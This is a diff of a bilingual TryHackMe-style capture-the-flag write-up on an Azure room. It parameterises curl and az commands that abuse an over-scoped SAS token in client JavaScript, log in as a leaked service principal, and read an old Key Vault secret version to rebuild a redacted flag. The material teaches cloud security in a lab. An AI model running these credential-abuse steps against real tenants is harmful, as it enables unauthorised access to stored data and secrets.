@@ -175,7 +175,7 @@
       <span class="tag">Cloud</span><span class="tag">TryHackMe</span>
       <span class="tag">TryHackMe</span>
       <time class="meta-item" datetime="2026-08-04" data-it="04 Ago 2026" data-en="04 Aug 2026">04 Ago 2026</time>
-      <span class="meta-item" data-it="6 min di lettura" data-en="6 min read">6 min di lettura</span>
+      <span class="meta-item" data-it="8 min di lettura" data-en="8 min read">8 min di lettura</span>
       <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
       <span class="meme-tag" data-it="// backup nel cloud, chiavi nel sorgente" data-en="// backups in the cloud, keys in the source">// backup nel cloud, chiavi nel sorgente</span>
     </div>
@@ -201,6 +201,7 @@
 </div></div>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># credenziali cablate nel client: pubbliche per definizione</span>
+<span class="comment"># valori del deploy D'ESEMPIO: il suffisso dell'account è unico per la TUA istanza</span>
 <span class="neutral">const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";</span>
 <span class="neutral">const BACKUPS_CONTAINER = "backups";</span>
 <span class="neutral">const BACKUP_SAS =</span>
@@ -208,10 +209,27 @@
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># credentials wired into the client: public by definition</span>
+<span class="comment"># values from the SAMPLE deploy: the account suffix is unique to YOUR instance</span>
 <span class="neutral">const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";</span>
 <span class="neutral">const BACKUPS_CONTAINER = "backups";</span>
 <span class="neutral">const BACKUP_SAS =</span>
   "?sv=2022-11-02&amp;ss=b&amp;srt=<span class="danger">sco</span>&amp;sp=<span class="danger">rl</span>&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=...";</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="I valori istanza-specifici (il suffisso dello &lt;em&gt;storage account&lt;/em&gt;, i GUID del &lt;em&gt;service principal&lt;/em&gt;, il nome del Key Vault) cambiano a ogni deploy: leggi sempre i &lt;strong&gt;tuoi&lt;/strong&gt; dal tuo &lt;code&gt;app.js&lt;/code&gt; e dal tuo &lt;code&gt;backup-service-account.json&lt;/code&gt;, non copiare quelli di questo writeup, altrimenti colpisci un account che sul tuo target non esiste." data-en="The instance-specific values (the &lt;em&gt;storage account&lt;/em&gt; suffix, the &lt;em&gt;service principal&lt;/em&gt; GUIDs, the Key Vault name) change on every deploy: always read &lt;strong&gt;your own&lt;/strong&gt; from your &lt;code&gt;app.js&lt;/code&gt; and your &lt;code&gt;backup-service-account.json&lt;/code&gt;, don't copy the ones in this writeup, or you'll hit an account that doesn't exist on your target.">I valori istanza-specifici (il suffisso dello <em>storage account</em>, i GUID del <em>service principal</em>, il nome del Key Vault) cambiano a ogni deploy: leggi sempre i <strong>tuoi</strong> dal tuo <code>app.js</code> e dal tuo <code>backup-service-account.json</code>, non copiare quelli di questo writeup, altrimenti colpisci un account che sul tuo target non esiste.</p>
+</div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># NON copiare i valori qui sopra: appartengono al deploy d'esempio.</span>
+<span class="comment"># Metti i TUOI (letti dal tuo app.js) in variabili di shell e riusale ovunque:</span>
+<span class="neutral">STORAGE="&lt;il tuo STORAGE_ACCOUNT&gt;"           # es. cryptocabana&lt;suffisso-random&gt;</span>
+<span class="neutral">SAS="&lt;il tuo BACKUP_SAS, senza il '?' iniziale&gt;"</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># do NOT copy the values above: they belong to the sample deploy.</span>
+<span class="comment"># put YOURS (read from your own app.js) into shell variables and reuse them everywhere:</span>
+<span class="neutral">STORAGE="&lt;your STORAGE_ACCOUNT&gt;"             # e.g. cryptocabana&lt;random-suffix&gt;</span>
+<span class="neutral">SAS="&lt;your BACKUP_SAS, without the leading '?'&gt;"</span></pre>
 </div></div>
     <p data-it="Regola numero uno del cloud: &lt;strong&gt;tutto ciò che arriva al browser è pubblico&lt;/strong&gt;. Un SAS token nel JS non è offuscato, è consegnato. E un SAS è un &lt;em&gt;bearer token&lt;/em&gt; in chiaro: &lt;code&gt;srt&lt;/code&gt; e &lt;code&gt;sp&lt;/code&gt; si leggono a occhio nella query string, permessi stampati sulla chiave." data-en="Cloud rule number one: &lt;strong&gt;anything that reaches the browser is public&lt;/strong&gt;. A SAS token in JS isn't obfuscated, it's handed over. And a SAS is a plaintext &lt;em&gt;bearer token&lt;/em&gt;: &lt;code&gt;srt&lt;/code&gt; and &lt;code&gt;sp&lt;/code&gt; read straight off the query string, permissions printed right on the key.">Regola numero uno del cloud: <strong>tutto ciò che arriva al browser è pubblico</strong>. Un SAS token nel JS non è offuscato, è consegnato. E un SAS è un <em>bearer token</em> in chiaro: <code>srt</code> e <code>sp</code> si leggono a occhio nella query string, permessi stampati sulla chiave.</p>
 
@@ -229,11 +247,11 @@
     <p data-it="Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un &lt;em&gt;Service SAS&lt;/em&gt; sul singolo container/blob con permesso &lt;em&gt;create/write&lt;/em&gt;, meglio se legato a una &lt;em&gt;stored access policy&lt;/em&gt; revocabile. Qui invece &lt;code&gt;srt=sco&lt;/code&gt; include la &lt;strong&gt;s&lt;/strong&gt; di &lt;em&gt;service&lt;/em&gt;: è proprio quella singola lettera che abilita la &lt;code&gt;?comp=list&lt;/code&gt; alla radice dell'account. La distanza tra &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; e &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; è tutta la vulnerabilità. Ironia: il token è &lt;em&gt;read+list&lt;/em&gt;, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa." data-en="Here's the analysis that matters. To write a single blob you don't need an Account SAS at all: a &lt;em&gt;Service SAS&lt;/em&gt; on the single container/blob with &lt;em&gt;create/write&lt;/em&gt; is enough, ideally tied to a revocable &lt;em&gt;stored access policy&lt;/em&gt;. Instead &lt;code&gt;srt=sco&lt;/code&gt; includes the &lt;strong&gt;s&lt;/strong&gt; for &lt;em&gt;service&lt;/em&gt;: that one letter is exactly what enables &lt;code&gt;?comp=list&lt;/code&gt; at the account root. The gap between &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; and &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; is the entire vulnerability. Irony: the token is &lt;em&gt;read+list&lt;/em&gt;, so it can't even do the write the kiosk claims to need, but it happily hands me a map.">Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un <em>Service SAS</em> sul singolo container/blob con permesso <em>create/write</em>, meglio se legato a una <em>stored access policy</em> revocabile. Qui invece <code>srt=sco</code> include la <strong>s</strong> di <em>service</em>: è proprio quella singola lettera che abilita la <code>?comp=list</code> alla radice dell'account. La distanza tra <code>o</code>+<code>cw</code> e <code>sco</code>+<code>rl</code> è tutta la vulnerabilità. Ironia: il token è <em>read+list</em>, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># lo scope 's' (service) abilita la list a livello di account</span>
-curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;&lt;SAS&gt;'</pre>
+curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS"</pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># the 's' (service) scope enables account-level listing</span>
-curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;&lt;SAS&gt;'</pre>
+curl -s "https://$STORAGE.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;$SAS"</pre>
 </div></div>
     <div class="callout">
   <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
@@ -244,13 +262,13 @@ curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">
     <p data-it="Il container &lt;code&gt;vault&lt;/code&gt; contiene due blob: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, un depistaggio, e &lt;code&gt;backup-service-account.json&lt;/code&gt;, il vero premio." data-en="The &lt;code&gt;vault&lt;/code&gt; container holds two blobs: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, a decoy, and &lt;code&gt;backup-service-account.json&lt;/code&gt;, the real prize.">Il container <code>vault</code> contiene due blob: <code>seed_phrase.txt</code>, un depistaggio, e <code>backup-service-account.json</code>, il vero premio.</p>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># elenco i blob del container 'vault' e scarico il JSON</span>
-<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;&lt;SAS&gt;'</span>
-<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?&lt;SAS&gt;'</span></pre>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS"</span>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault/backup-service-account.json?$SAS" -o backup-service-account.json</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># list the 'vault' container's blobs and pull the JSON</span>
-<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;&lt;SAS&gt;'</span>
-<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?&lt;SAS&gt;'</span></pre>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;$SAS"</span>
+<span class="neutral">curl -s "https://$STORAGE.blob.core.windows.net/vault/backup-service-account.json?$SAS" -o backup-service-account.json</span></pre>
 </div></div>
     <div class="lang-it"><div class="code-block">
 <pre><span class="neutral">{</span>
@@ -258,7 +276,8 @@ curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">
   "client_secret": "<span class="danger">████████████████████████</span>",
 <span class="neutral">  "key_vault_name": "ccabana-kv-f5scjagc",</span>
 <span class="neutral">  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",</span>
-<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"</span>
+<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",</span>
+<span class="neutral">  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"</span>
 <span class="neutral">}</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
@@ -267,32 +286,61 @@ curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">
   "client_secret": "<span class="danger">████████████████████████</span>",
 <span class="neutral">  "key_vault_name": "ccabana-kv-f5scjagc",</span>
 <span class="neutral">  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",</span>
-<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"</span>
+<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",</span>
+<span class="neutral">  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"</span>
 <span class="neutral">}</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># di nuovo: client_id, tenant_id, secret e nome del vault sono del TUO deploy.</span>
+<span class="comment"># estraili dal JSON appena scaricato (jq comodo, ma vanno bene anche gli occhi):</span>
+<span class="neutral">CLIENT_ID=$(jq -r .client_id backup-service-account.json)</span>
+<span class="neutral">CLIENT_SECRET=$(jq -r .client_secret backup-service-account.json)</span>
+<span class="neutral">TENANT=$(jq -r .tenant_id backup-service-account.json)</span>
+<span class="neutral">KV=$(jq -r .key_vault_name backup-service-account.json)</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># again: client_id, tenant_id, secret and vault name are from YOUR deploy.</span>
+<span class="comment"># extract them from the JSON you just downloaded (jq is handy, but eyeballs work too):</span>
+<span class="neutral">CLIENT_ID=$(jq -r .client_id backup-service-account.json)</span>
+<span class="neutral">CLIENT_SECRET=$(jq -r .client_secret backup-service-account.json)</span>
+<span class="neutral">TENANT=$(jq -r .tenant_id backup-service-account.json)</span>
+<span class="neutral">KV=$(jq -r .key_vault_name backup-service-account.json)</span></pre>
 </div></div>
     <p data-it="Un &lt;em&gt;service principal&lt;/em&gt; Azure AD completo: &lt;code&gt;client_id&lt;/code&gt;, &lt;code&gt;client_secret&lt;/code&gt;, &lt;code&gt;tenant_id&lt;/code&gt; e il nome del Key Vault. La fiducia che il chiosco riponeva nello storage si estende dritta dentro il vault. È il classico &lt;strong&gt;trust chain che compone&lt;/strong&gt;: ogni salto allarga il raggio d'azione del leak iniziale." data-en="A full Azure AD &lt;em&gt;service principal&lt;/em&gt;: &lt;code&gt;client_id&lt;/code&gt;, &lt;code&gt;client_secret&lt;/code&gt;, &lt;code&gt;tenant_id&lt;/code&gt;, and the Key Vault name. The trust the kiosk placed in storage extends straight into the vault. Classic &lt;strong&gt;compounding trust chain&lt;/strong&gt;: each hop widens the blast radius of the original leak.">Un <em>service principal</em> Azure AD completo: <code>client_id</code>, <code>client_secret</code>, <code>tenant_id</code> e il nome del Key Vault. La fiducia che il chiosco riponeva nello storage si estende dritta dentro il vault. È il classico <strong>trust chain che compone</strong>: ogni salto allarga il raggio d'azione del leak iniziale.</p>
     <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># prerequisito: la Azure CLI ('az'). Se non ce l'hai già:</span>
+<span class="neutral">curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash   # Debian / Parrot / Ubuntu</span>
+<span class="comment"># in alternativa, dentro un virtualenv:  pip install azure-cli</span>
+<span class="neutral">az version   # deve rispondere con le versioni dei componenti</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># prerequisite: the Azure CLI ('az'). If you don't have it yet:</span>
+<span class="neutral">curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash   # Debian / Parrot / Ubuntu</span>
+<span class="comment"># alternatively, inside a virtualenv:  pip install azure-cli</span>
+<span class="neutral">az version   # it should print the component versions</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># mi autentico come il service principal trapelato</span>
 <span class="neutral">az login --service-principal \</span>
-<span class="neutral">  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \</span>
-  -p '<span class="danger">████████████████████████</span>' \
-<span class="neutral">  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</span></pre>
+<span class="neutral">  -u "$CLIENT_ID" \</span>
+<span class="neutral">  -p "$CLIENT_SECRET" \</span>
+<span class="neutral">  --tenant "$TENANT"</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># authenticate as the leaked service principal</span>
 <span class="neutral">az login --service-principal \</span>
-<span class="neutral">  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \</span>
-  -p '<span class="danger">████████████████████████</span>' \
-<span class="neutral">  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</span></pre>
+<span class="neutral">  -u "$CLIENT_ID" \</span>
+<span class="neutral">  -p "$CLIENT_SECRET" \</span>
+<span class="neutral">  --tenant "$TENANT"</span></pre>
 </div></div>
     <div class="lang-it"><div class="code-block">
 <pre><span class="comment"># quali secret vivono nel vault?</span>
-<span class="neutral">az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table</span>
+<span class="neutral">az keyvault secret list --vault-name "$KV" -o table</span>
 # key-shard-1  key-shard-2  key-shard-3  master-key (<span class="warn">scaduto 2020</span>)</pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
 <pre><span class="comment"># which secrets live in the vault?</span>
-<span class="neutral">az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table</span>
+<span class="neutral">az keyvault secret list --vault-name "$KV" -o table</span>
 # key-shard-1  key-shard-2  key-shard-3  master-key (<span class="warn">expired 2020</span>)</pre>
 </div></div>
     <div class="callout">
@@ -303,35 +351,79 @@ curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">
     <h2 data-it="[04] La versione ruotata e la ricostruzione della flag" data-en="[04] The rotated version and rebuilding the flag" id='flag'>[04] La versione ruotata e la ricostruzione della flag</h2>
     <p data-it="L'hint della room è esplicito: «se un valore sembra appena ruotato, chiediti com'era cinque minuti prima». Traduzione operativa: controllo lo &lt;em&gt;storico versioni&lt;/em&gt; di ogni shard." data-en="The room's hint is explicit: &quot;if a value looks freshly rotated, ask yourself what it looked like five minutes before that.&quot; Operationally: I check the &lt;em&gt;version history&lt;/em&gt; of every shard.">L'hint della room è esplicito: «se un valore sembra appena ruotato, chiediti com'era cinque minuti prima». Traduzione operativa: controllo lo <em>storico versioni</em> di ogni shard.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="comment"># controllo lo storico versioni di ogni shard</span>
+<pre><span class="comment"># quante versioni ha ciascuno shard? quello con più di 1 è il sospetto</span>
 <span class="neutral">for s in key-shard-1 key-shard-2 key-shard-3; do</span>
-<span class="neutral">  az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name $s -o json</span>
+<span class="neutral">  n=$(az keyvault secret list-versions --vault-name "$KV" --name "$s" --query "length(@)")</span>
+<span class="neutral">  echo "$s: $n versioni"</span>
 <span class="neutral">done</span>
-# shard-1: 1 versione   shard-3: 1 versione   <span class="warn">shard-2: 2 versioni, a 2s di distanza</span></pre>
+# key-shard-1: 1   key-shard-3: 1   <span class="warn">key-shard-2: 2 versioni</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="comment"># check each shard's version history</span>
+<pre><span class="comment"># how many versions does each shard have? the one with more than 1 is the suspect</span>
 <span class="neutral">for s in key-shard-1 key-shard-2 key-shard-3; do</span>
-<span class="neutral">  az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name $s -o json</span>
+<span class="neutral">  n=$(az keyvault secret list-versions --vault-name "$KV" --name "$s" --query "length(@)")</span>
+<span class="neutral">  echo "$s: $n versions"</span>
 <span class="neutral">done</span>
-# shard-1: 1 version   shard-3: 1 version   <span class="warn">shard-2: 2 versions, 2s apart</span></pre>
+# key-shard-1: 1   key-shard-3: 1   <span class="warn">key-shard-2: 2 versions</span></pre>
 </div></div>
     <p data-it="&lt;code&gt;key-shard-1&lt;/code&gt; e &lt;code&gt;key-shard-3&lt;/code&gt; hanno una sola versione. &lt;code&gt;key-shard-2&lt;/code&gt; ne ha &lt;strong&gt;due&lt;/strong&gt;, create a due secondi di distanza: una rotazione lampo. Il valore corrente è l'esca; quello buono è nella versione &lt;strong&gt;precedente&lt;/strong&gt;, ancora abilitata." data-en="&lt;code&gt;key-shard-1&lt;/code&gt; and &lt;code&gt;key-shard-3&lt;/code&gt; have a single version. &lt;code&gt;key-shard-2&lt;/code&gt; has &lt;strong&gt;two&lt;/strong&gt;, created two seconds apart: a snap rotation. The current value is the bait; the good one is in the &lt;strong&gt;previous&lt;/strong&gt; version, still enabled."><code>key-shard-1</code> e <code>key-shard-3</code> hanno una sola versione. <code>key-shard-2</code> ne ha <strong>due</strong>, create a due secondi di distanza: una rotazione lampo. Il valore corrente è l'esca; quello buono è nella versione <strong>precedente</strong>, ancora abilitata.</p>
     <div class="lang-it"><div class="code-block">
-<pre><span class="comment"># la versione CORRENTE è il depistaggio; leggo quella PRECEDENTE (ancora abilitata)</span>
-<span class="neutral">az keyvault secret show --vault-name ccabana-kv-f5scjagc \</span>
-  --name key-shard-2 --version <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span> \
-<span class="neutral">  --query value -o tsv</span>
-# shard-1 + shard-2(old) + shard-3  =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+<pre><span class="comment"># ordino le versioni di key-shard-2 per data di creazione: la più VECCHIA è quella buona</span>
+<span class="neutral">az keyvault secret list-versions --vault-name "$KV" --name key-shard-2 \</span>
+<span class="neutral">  --query "sort_by([].{id:id, enabled:attributes.enabled, created:attributes.created}, &amp;created)" \</span>
+<span class="neutral">  -o table</span>
+<span class="comment"># la riga con 'created' più vecchio e 'enabled: True' è il bersaglio:</span>
+<span class="comment"># il numero di versione è il GUID finale dell'id, dopo l'ultimo '/'</span></pre>
 </div></div>
 <div class="lang-en"><div class="code-block">
-<pre><span class="comment"># the CURRENT version is the decoy; read the PREVIOUS one (still enabled)</span>
-<span class="neutral">az keyvault secret show --vault-name ccabana-kv-f5scjagc \</span>
-  --name key-shard-2 --version <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span> \
-<span class="neutral">  --query value -o tsv</span>
-# shard-1 + shard-2(old) + shard-3  =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+<pre><span class="comment"># sort key-shard-2's versions by creation date: the OLDEST is the good one</span>
+<span class="neutral">az keyvault secret list-versions --vault-name "$KV" --name key-shard-2 \</span>
+<span class="neutral">  --query "sort_by([].{id:id, enabled:attributes.enabled, created:attributes.created}, &amp;created)" \</span>
+<span class="neutral">  -o table</span>
+<span class="comment"># the row with the oldest 'created' and 'enabled: True' is the target:</span>
+<span class="comment"># the version number is the trailing GUID of the id, after the last '/'</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># la versione CORRENTE è il depistaggio; mi serve la PRECEDENTE (created più vecchio)</span>
+<span class="comment"># estraggo in automatico il GUID della versione più vecchia (ultimo campo dell'id):</span>
+<span class="neutral">OLD_VER=$(az keyvault secret list-versions --vault-name "$KV" --name key-shard-2 \</span>
+<span class="neutral">  --query "sort_by(@, &amp;attributes.created)[0].id" -o tsv | awk -F/ '{print $NF}')</span>
+echo "$OLD_VER"   # es. <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span>
+<span class="neutral"></span>
+<span class="comment"># leggo il valore di QUELLA versione (ancora enabled)</span>
+<span class="neutral">az keyvault secret show --vault-name "$KV" \</span>
+<span class="neutral">  --name key-shard-2 --version "$OLD_VER" \</span>
+<span class="neutral">  --query value -o tsv</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the CURRENT version is the decoy; I need the PREVIOUS one (oldest created)</span>
+<span class="comment"># auto-extract the oldest version's GUID (the id's last field):</span>
+<span class="neutral">OLD_VER=$(az keyvault secret list-versions --vault-name "$KV" --name key-shard-2 \</span>
+<span class="neutral">  --query "sort_by(@, &amp;attributes.created)[0].id" -o tsv | awk -F/ '{print $NF}')</span>
+echo "$OLD_VER"   # e.g. <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span>
+<span class="neutral"></span>
+<span class="comment"># read the value of THAT version (still enabled)</span>
+<span class="neutral">az keyvault secret show --vault-name "$KV" \</span>
+<span class="neutral">  --name key-shard-2 --version "$OLD_VER" \</span>
+<span class="neutral">  --query value -o tsv</span></pre>
 </div></div>
     <p data-it="Il punto sottile: in Key Vault una rotazione crea una &lt;em&gt;nuova versione&lt;/em&gt; ma &lt;strong&gt;non tocca&lt;/strong&gt; quelle vecchie. Restano &lt;em&gt;enabled&lt;/em&gt; e leggibili con lo stesso permesso &lt;em&gt;get&lt;/em&gt;. Chi ruota per rimediare a un leak spesso dimentica che il segreto trapelato è ancora lì, una &lt;code&gt;--version&lt;/code&gt; più indietro." data-en="The subtle point: in Key Vault a rotation creates a &lt;em&gt;new version&lt;/em&gt; but &lt;strong&gt;doesn't touch&lt;/strong&gt; the old ones. They stay &lt;em&gt;enabled&lt;/em&gt; and readable with the same &lt;em&gt;get&lt;/em&gt; permission. Whoever rotates to fix a leak often forgets the leaked secret is still there, one &lt;code&gt;--version&lt;/code&gt; back.">Il punto sottile: in Key Vault una rotazione crea una <em>nuova versione</em> ma <strong>non tocca</strong> quelle vecchie. Restano <em>enabled</em> e leggibili con lo stesso permesso <em>get</em>. Chi ruota per rimediare a un leak spesso dimentica che il segreto trapelato è ancora lì, una <code>--version</code> più indietro.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># ricostruzione: shard-1 + shard-2(versione vecchia) + shard-3</span>
+<span class="neutral">S1=$(az keyvault secret show --vault-name "$KV" --name key-shard-1 --query value -o tsv)</span>
+<span class="neutral">S2=$(az keyvault secret show --vault-name "$KV" --name key-shard-2 --version "$OLD_VER" --query value -o tsv)</span>
+<span class="neutral">S3=$(az keyvault secret show --vault-name "$KV" --name key-shard-3 --query value -o tsv)</span>
+<span class="neutral">echo "$S1$S2$S3"</span>
+# =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># rebuild: shard-1 + shard-2(old version) + shard-3</span>
+<span class="neutral">S1=$(az keyvault secret show --vault-name "$KV" --name key-shard-1 --query value -o tsv)</span>
+<span class="neutral">S2=$(az keyvault secret show --vault-name "$KV" --name key-shard-2 --version "$OLD_VER" --query value -o tsv)</span>
+<span class="neutral">S3=$(az keyvault secret show --vault-name "$KV" --name key-shard-3 --query value -o tsv)</span>
+<span class="neutral">echo "$S1$S2$S3"</span>
+# =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
     <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
     <div class="callout">
       <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
